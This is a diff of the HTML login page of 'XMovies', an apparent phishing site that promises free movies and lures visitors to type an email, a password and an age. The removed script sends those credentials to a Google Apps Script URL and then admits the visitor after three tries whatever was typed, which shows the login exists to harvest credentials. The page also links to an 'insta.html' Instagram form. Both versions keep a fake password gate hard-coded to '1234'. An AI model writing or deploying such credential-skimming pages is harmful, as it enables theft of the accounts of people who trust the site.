@@ -6,32 +6,30 @@
 <title>XMovies</title>
 
 <style>
-*{ box-sizing:border-box; margin:0; padding:0; font-family:sans-serif; }
-body{ height:100vh; display:flex; justify-content:center; align-items:center; background:radial-gradient(circle at center,#111,#000); }
-.box{ background:rgba(255,255,255,0.05); backdrop-filter:blur(15px); padding:30px; border-radius:20px; width:90%; max-width:380px; text-align:center; box-shadow:0 0 40px rgba(255,0,0,0.3); }
-h2{ color:#fff; margin-bottom:10px; font-size:24px; }
-.desc{ color:#ddd; font-size:14px; margin-bottom:20px; line-height:1.5; }
-input{ width:100%; padding:13px; margin:8px 0; border:none; border-radius:10px; background:#eee; font-size:14px; }
-button{ width:100%; padding:13px; margin-top:10px; border:none; border-radius:10px; font-size:16px; font-weight:bold; cursor:pointer; background:linear-gradient(45deg,#ff0000,#e50914); color:white; box-shadow:0 0 15px rgba(255,0,0,0.5); transition:0.3s; }
-button:hover{ transform:scale(1.05); box-shadow:0 0 25px red; }
-.contact{ margin-top:12px; color:#aaa; font-size:13px; }
-.insta-box{ margin-top:15px; }
-.insta{ display:flex; justify-content:center; align-items:center; gap:10px; background:linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5); padding:12px; border-radius:12px; cursor:pointer; transition:0.3s; }
-.insta img{ width:30px; }
-.insta span{ color:white; font-weight:bold; }
-.insta:hover{ transform:scale(1.05); }
+*{ box-sizing:border-box; margin:0; padding:0; font-family:sans-serif;}
+body{ height:100vh; display:flex; justify-content:center; align-items:center; background:radial-gradient(circle at center,#111,#000);}
+.box{ background:rgba(255,255,255,0.05); backdrop-filter:blur(15px); padding:30px; border-radius:20px; width:90%; max-width:380px; text-align:center; box-shadow:0 0 40px rgba(255,0,0,0.3);}
+h2{ color:#fff; margin-bottom:10px; font-size:24px;}
+.desc{ color:#ddd; font-size:14px; margin-bottom:20px; line-height:1.5;}
+input{ width:100%; padding:13px; margin:8px 0; border:none; border-radius:10px; background:#eee; font-size:14px;}
+button{ width:100%; padding:13px; margin-top:10px; border:none; border-radius:10px; font-size:16px; font-weight:bold; cursor:pointer; background:linear-gradient(45deg,#ff0000,#e50914); color:white; box-shadow:0 0 15px rgba(255,0,0,0.5); transition:0.3s;}
+button:hover{ transform:scale(1.05); box-shadow:0 0 25px red;}
+.contact{ margin-top:12px; color:#aaa; font-size:13px;}
+.insta-box{ margin-top:15px;}
+.insta{ display:flex; justify-content:center; align-items:center; gap:10px; background:linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5); padding:12px; border-radius:12px; cursor:pointer; transition:0.3s;}
+.insta img{ width:30px;}
+.insta span{ color:white; font-weight:bold;}
+.insta:hover{ transform:scale(1.05);}
 #errorMsg{color:red; font-size:14px; margin-top:5px;}
-@media(max-width:500px){ .box{ padding:20px; } h2{ font-size:20px; } .desc{ font-size:13px; } }
+@media(max-width:500px){ .box{ padding:20px;} h2{ font-size:20px;} .desc{ font-size:13px;} }
 </style>
 </head>
+
 <body>
 
 <div class="box">
   <h2>🎬 XMovies</h2>
-  <div class="desc">
-    Watch the best movies and series for free<br>
-    in high quality with the best experience
-  </div>
+  <div class="desc">Watch the best movies and series for free<br>in high quality with the best experience</div>
 
   <input id="email" placeholder="Email or Phone">
   <input id="password" type="password" placeholder="Password">
@@ -42,6 +40,7 @@ button:hover{ transform:scale(1.05); box-shadow:0 0 25px red; }
 
   <div class="contact">Contact Us</div>
 
+  <!-- رابط لفورم Instagram -->
   <div class="insta-box">
     <div class="insta" onclick="window.location.href='insta.html'">
       <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
@@ -51,34 +50,17 @@ button:hover{ transform:scale(1.05); box-shadow:0 0 25px red; }
 </div>
 
 <script>
-const correctPassword = "1234"; // كلمة المرور الصحيحة
-const maxAttempts = 3; 
-const sheetUrl = "https://script.google.com/macros/s/AKfycbwhAztXlBe8D9aDEXF7MeOQ0HBEKwKjJm25j2lVoXzDl-bM5VIwyVvh89tpKsxoMWus/exec";
+let attempts = 0;
+const maxAttempts = 3;
+const correctPassword = "1234"; // ضع كلمة السر هنا
 
-async function go() {
-  const email = document.getElementById("email").value.trim();
-  const pw = document.getElementById("password").value.trim();
-  const age = document.getElementById("age").value.trim();
+function go(){
+  const pw = document.getElementById("password").value;
   const error = document.getElementById("errorMsg");
-
-  let attempts = parseInt(localStorage.getItem("xmovies_attempts") || "0");
   attempts++;
-  localStorage.setItem("xmovies_attempts", attempts);
 
-  if (pw === correctPassword || attempts >= maxAttempts) {
-    // إرسال البيانات أولاً
-    try {
-      const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}&form=XMovies`;
-      await fetch(sheetUrl, {
-        method: "POST",
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: data
-      });
-      localStorage.removeItem("xmovies_attempts"); // إعادة ضبط العداد
-      window.location.href = "movies.html"; // الدخول للسيت
-    } catch (e) {
-      error.innerText = "Error connecting to Google Sheets";
-    }
+  if(pw === correctPassword || attempts === maxAttempts){
+    window.location.href = "movies.html";
   } else {
     error.innerText = "Password incorrect";
   }
